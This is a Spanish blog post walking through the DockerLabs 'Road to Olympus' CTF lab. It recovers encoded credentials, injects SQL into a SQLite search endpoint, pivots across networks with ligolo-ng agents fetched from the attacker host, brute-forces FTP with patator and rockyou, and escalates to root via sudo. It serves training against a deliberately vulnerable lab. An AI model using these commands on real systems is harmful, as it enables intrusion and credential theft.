---
layout: post
title: Road to olympus
date: 2024.09.17
categories: [dockerlabs, ctf, linux, dificil]
---

Estamos ante un laboratorio que contiene 3 máquinas con distribuciones Linux creado por **Patxasec**. Es de nivel difícil y es de la plataforma [dockerlabs](https://dockerlabs.es/).

# 1-Hades

Empezamos haciendo un escaneo rápido de puertos: 

```bash
$ rustscan -a 10.10.10.2 -b 25
Open 10.10.10.2:22
Open 10.10.10.2:80
```

Encontramos los puertos **22** y **80** abiertos. Ahora hacemos un escaneo de servicios y versiones con `nmap`.

```bash
$ sudo nmap -sCV -p22,80 -v 10.10.10.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 7e851a70b52ec635739b6477ba5f728b (ECDSA)
|_  256 0a6756221ea1aa0544f0b905756d9c36 (ED25519)
80/tcp open  http    Werkzeug/3.0.4 Python/3.12.3
|_http-server-header: Werkzeug/3.0.4 Python/3.12.3
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Not A CTF
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.4 Python/3.12.3

```

No vemos nada relevante, asi que vamos a explorar la web con `curl`:

```bash
$ curl -vvvv http://10.10.10.2
<!-- Guardar en KeePass y borrar al verlo.
Nueva contraseña para el servicio SSH de cerbero el perro de 3 cabezas JZKECZ2NPJAWOTT2JVTU42SVM5HGU23HJZVFCZ22NJGWOTTNKVTU26SJM5GXUQLHJV5ESZ2NPJEWOTLKIU6Q==== -->
```

Encontramos un hash. Tratamos de decodearlo usando **base64** pero no tenemos resultado. Usando [cyberchef](https://cyberchef.io/) vemos que esta encodeado primero usando **base32** y luego en **base64** para darnos un resultado en **hexadecimal**. Usamos `xxd -r -p` para pasar de hexadecimal a texto simple:

```bash
$ echo 'JZKECZ2NPJAWOTT2JVTU42SVM5HGU23HJZVFCZ22NJGWOTTNKVTU26SJM5GXUQLHJV5ESZ2NPJEWOTLKIU6Q====' | base32 -d | base64 -d | xxd -r -p
P0seidón2022!
```

Encontramos un password para un supuesto usuario **cerbero**. Probamos a conectarnos usando esas credenciales y obtenemos acceso a la primera máquina.

```bash
$ ssh cerbero@10.10.10.2
cerbero@10.10.10.2's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

cerbero@4657df97b944:~$
```

### Pivoting

Vamos a usar [ligolo-ng](https://github.com/Nicocha30/ligolo-ng) para hacer el pivoting a las diferentes redes. Nos bajamos del repositorio las versiones que necesitamos y nos mandamos a la máquina víctima el agente. Le damos también permiso de ejecución.

```bash
cerbero@7c938e91755b:~$ wget http://10.10.10.1:8000/agent && chmod +x agent
```

En nuestro equipo nos ponemos a la escucha con el binario `proxy` y le ponemos como argumento `-selfcert` para que nos genere un certificado para la sesión. Es importante ejecutarlo como **root** porque debemos crear interfaces y es necesario ser root para crearlas.

```bash
$ sudo ./proxy -selfcert
```

Desde la máquina victima ejecutamos el agente para que se conecte a nuestro proxy y que no valide el certificado:

```bash
cerbero@febfcab0b0a6:~$ ./agent -connect 10.10.10.1:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.10.1:11601"
```

Vemos que se ha establecido la conexión. En el proxy seleccionamos la sesión recien creada con `session`. Una vez elegida ejecutamos `autoroute`. Elegimos la red a la que queremos pivotar, le indicamos que nos cree una interfaz nueva y que inicie el tunel.

```bash
ligolo-ng » INFO[0111] Agent joined.                                 name=cerbero@febfcab0b0a6 remote="10.10.10.2:52042"
ligolo-ng » session
? Specify a session : 1 - cerbero@febfcab0b0a6 - 10.10.10.2:52042 - ae1e5a3e-c937-46d2-b383-ef4960acca26
[Agent : cerbero@febfcab0b0a6] » autoroute
? Select routes to add: 20.20.20.2/24? Create a new interface or use an existing one? Create a new interface
INFO[0161] Generating a random interface name...        
INFO[0161] Creating a new "justego" interface...        
INFO[0161] Using interface justego, creating routes...  
INFO[0161] Route 20.20.20.2/24 created.                 
? Start the tunnel? Yes
[Agent : cerbero@febfcab0b0a6] » INFO[0164] Starting tunnel to cerbero@febfcab0b0a6
```

Si todo ha salido bien ya tendremos acceso a la máquina **Poseidon**.

# 2-Poseidon

Hacemos un escaneo rápido con `rustscan`:

```bash
$ rustscan -a 20.20.20.3 -b 30
Open 20.20.20.3:22
Open 20.20.20.3:80
```

Encontramos los puertos **22** y **80** abiertos. Ahora hacemos un escaneo de servicios y versiones con `nmap`.

```bash
$ sudo nmap -sCV -p22,80 -v 20.20.20.3
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 41eae9708838112b1f363acbbd1abbe2 (RSA)
|   256 2cd8bf01057e7a70387c7bf2ba544b20 (ECDSA)
|_  256 2037e59215dc6918dc09bb69746daec5 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Dojos El Papapasito del mar
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

En esta ocasión tampoco encontramos nada relevante. Hacemos un fuzzing a ver si encontramos algo que nos permita seguir con el ataque:

```bash
$ feroxbuster -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -r -d 2 -x .php -u http://20.20.20.3
200      GET        1l        6w       34c http://20.20.20.3/database.php
200      GET      157l      357w     3863c http://20.20.20.3/buscador/oraculo.html
```

Encontramos el fichero **database.php** y **/buscador/oraculo.html**. Vemos como hace la consulta a la BBDD:

```bash
curl -vvvv http://20.20.20.3/buscador/oraculo.html
form.addEventListener('submit', (e) => {
  e.preventDefault();
  const buscar = input.value.trim();
  if (buscar !== '') {
    fetch('../database.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `buscar=${encodeURIComponent(buscar)}`,
    })
      .then((response) => response.text())
      .then((data) => {
        resultado.innerHTML = data;
      })
      .catch((error) => console.error(error));
  }

```

Probamos a ver si hay alguna **SQLi** en el buscador:

```bash
$ ghauri -u http://20.20.20.3/database.php --data 'buscar=a' --dbs
Parameter: buscar (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: buscar=a" AND 08905=8905– wXyW
```

Vemos que hay una vulnerabilidad pero es un falso positivo. Probamos a ver si la BBDD es en sqlite ya que las herramientas no están preparadas para hacer inyecciones a sqlite. Le hacemos una consulta para ver los nombres de las tablas:

```bash
$ curl --data 'buscar=select%20name%20from%20sqlite_master' http://20.20.20.3/database.php
dioses_semidioses<br />
sqlite_sequence<br />
powers<br />
usuarios<br />
sqlite_autoindex_usuarios_1<br />
sqlite_autoindex_usuarios_2<br />
contrasena<br />
sqlite_autoindex_contrasena_1<br />
atlantis<br />
```

Encontramos varias tablas, hacemos un dump de la tabla **atlantis**:

```bash
$ curl --data 'buscar=select%20*%20from%20atlantis' http://20.20.20.3/database.php
1 | Poseidón | $sha1$oceanos$QqFgxFPmqRex1ZKFCZ2ONJKWOTTNKFTU46SBM5ZKFCZ2ONJKWOTTNKFTU4GQPdkh3nQSWp3I=<br />
2 | megalodon | $sha1$hahahaha$JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=<br />
```

Encontramos 2 usuarios con su correspondiente contraseña. Desciframos la contraseña de la misma manera que desciframos la anterior:

```bash
$ echo 'JZKFCZ2ONJKWOTTNKFTU46SBM5HG2TLHJV5ECZ2NPJEWOTL2IFTU26SFM5GXU23HJVVEKPI=' | base32 -d | base64 -d | xxd -r -p
Templ02019!
```

Nos conectamos con el usuario **megalodon** y la contraseña a la máquina **Poseidon**:

```bash
$ ssh megalodon@20.20.20.3
megalodon@20.20.20.3's password:
$ whoami
megalodon
$
```

Ahora necesitamos pasar el agente a la máquina Poseidon, y como tenemos el servidor web en python en la red 10.10.10.0 y esta máquina esta en el segmento 20.20.20.0 no podemos conectarnos directamente para descargar el agent. Ligolo-ng tiene una funcionalidad que sirve para hacer **port forwarding** y asi poder llegar de una red a otra. Ejecutamos `listener_add`: 

```bash
[Agent : cerbero@b4fc92f8d22b] » listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000
INFO[0287] Listener 0 created on remote agent!
```

Y nos descargamos el **agent** y le damos permisos de ejecución:

```bash
megalodon@1f0e1fcaf473:~$ curl http://20.20.20.2:8000/agent -O && chmod +x agent
```

Ahora tenemos que hacer lo mismo para poder conectarnos al proxy en nuestra máquina. Hacemos **port forwarding** del puerto **11601** que es donde está a la escucha nuestro **proxy**:

```bash
[Agent : cerbero@b4fc92f8d22b] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
INFO[0361] Listener 1 created on remote agent!
```

Esta vez en vez de conectar el agente al proxy vamos a hacer en el sentido contrario. Poner a la escucha el agente y conectarnos desde el proxy. Ponemo el agente a la escucha con el argumento `bind` y la `IP` y el `puerto` donde estará a la escucha:

```bash
megalodon@143546c5c4b6:~$ ./agent -bind 0.0.0.0:7777
WARN[0000] TLS Certificate fingerprint is: 290A01EDAAA2C994292BF2409288C32851752B9D2C493F32AC4F03C9F507DB76 
INFO[0000] Listening on 0.0.0.0:7777...                 
```

Ahora desde el proxy nos conectamos a Poseidon y elegimos la nueva sesión:

```bash
[Agent : cerbero@b4fc92f8d22b] » connect_agent --ip 20.20.20.3:7777
? TLS Certificate Fingerprint is: 290A01EDAAA2C994292BF2409288C32851752B9D2C493F32AC4F03C9F507DB76, connect? Yes
INFO[0999] Agent connected.                              name=megalodon@143546c5c4b6 remote="20.20.20.3:7777"
[Agent : cerbero@b4fc92f8d22b] » session 
? Specify a session : 2 - megalodon@143546c5c4b6 - 20.20.20.3:7777 - 34cad36b-0a5a-49eb-9314-2dd105235253[Agent : megalodon@143546c5c4b6] »  
```

En el agente vemos que la conexión ha sido establecida:

```bash
INFO[0005] Got connection from: 20.20.20.2:47572        
INFO[0005] Connection established                        addr="20.20.20.2:47572"
```

Volvemos al proxy y hacemos otro **autoroute** a la última red, le decimos que nos cree una interfaz nueva y que abra el túnel:

```bash
[Agent : megalodon@143546c5c4b6] » autoroute 
? Select routes to add: 30.30.30.2/24? Create a new interface or use an existing one? Create a new interface
INFO[1125] Generating a random interface name...        
INFO[1125] Creating a new "guidedpenance" interface...  
INFO[1125] Using interface guidedpenance, creating routes... 
INFO[1125] Route 30.30.30.2/24 created.                 
? Start the tunnel? Yes
[Agent : megalodon@143546c5c4b6] » INFO[1127] Starting tunnel to megalodon@143546c5c4b6    
[Agent : megalodon@143546c5c4b6] » 
```

# 3-Zeus

Vamos a por la última máquina. Volvemos a hacer un escaneo rápido:

```bash
$ rustscan -a 30.30.30.3 -b 35
Open 30.30.30.3:22
Open 30.30.30.3:21
Open 30.30.30.3:80
Open 30.30.30.3:139
Open 30.30.30.3:445
```

Buscamos que servicios y que versiones hay en los puertos **21,22,80,139** y **445** con `nmap -sCV`:

```bash
$ nmap -sCV -p21,22,80,139,445 -v 30.30.30.3
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
22/tcp  open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73eb17b376b12663b8ed142a48e9c08c (ECDSA)
|_  256 e2c95685e511be8318238786fb943f7f (ED25519)
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-09-14T23:16:11
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: ZEUS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   ZEUS<00>             Flags: <unique><active>
|   ZEUS<03>             Flags: <unique><active>
|   ZEUS<20>             Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   OLIMPO<00>           Flags: <group><active>
|   OLIMPO<1d>           Flags: <unique><active>
|_  OLIMPO<1e>           Flags: <group><active>
```

No vemos nada relevante. Vamos a enumerar el servicio **SMB** con `enum4linux-ng`:

```bash
$ python3 enum4linux-ng.py -A 30.30.30.3
[*] Testing share shared
[+] Mapping: OK, Listing: OK

$ python3 enum4linux-ng.py 30.30.30.3 -R 1
[+] Found user 'Unix User\rayito' (RID 1000)
[+] Found user 'Unix User\hercules' (RID 1001)
```

Encontramos 2 usuarios del sistema, **rayito** y **hercules**,y un recurso compartido en el que tenemos permiso de lectura. No encontramos nada en el recurso compartido **shared**

Vamos a probar a hacer un ataque de fuerza bruta al servicio **FTP** con el usuario **hercules**:

```bash
$ patator ftp_login host=30.30.30.3 user=hercules password=FILE0 0=rockyou.txt -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
...
16:13:45 patator    INFO - 230   17     0.057 | thunder1                           |  3981 | Login successful.
```

Encontramos una credencial para acceder al **FTP**, nos conectamos:

```bash
$ ftp hercules@30.30.30.3
Connected to 30.30.30.3.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Nos descargamos el fichero que hay:

```bash
ftp> get muerte_a_kratos.exe
```

En nuestra máquina vemos que cadenas de texto hay dentro del binario. Encontramos una cadena en **base64.**

```bash
$ strings muerte_a_kratos.exe
...
AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE=
.. 

```

La desciframos y encontramos una posible contraseña:

```bash
echo 'AGUAbABlAGMAdAByAG8AYwB1AHQANABjADEAMABuACE=' | base64 -d
electrocut4c10n!
```

Probamos a conectarnos por **ssh** con el usuario **rayito** y obtenemos acceso a la última máquina:

```bash
ssh rayito@30.30.30.3
rayito@30.30.30.3's password:
$ whoami
rayito
```

Podemos ejecutar cualquier cosa como **root**:

```bash
rayito@11f0a64a79da:~$ sudo -l
Matching Defaults entries for rayito on 11f0a64a79da:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User rayito may run the following commands on 11f0a64a79da:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```

Nos cambiamos a **root** y terminamos la máquina:

```bash
rayito@11f0a64a79da:~$ sudo su
root@11f0a64a79da:/home/rayito# cd
root@11f0a64a79da:~# whoami
root
root@11f0a64a79da:~#
```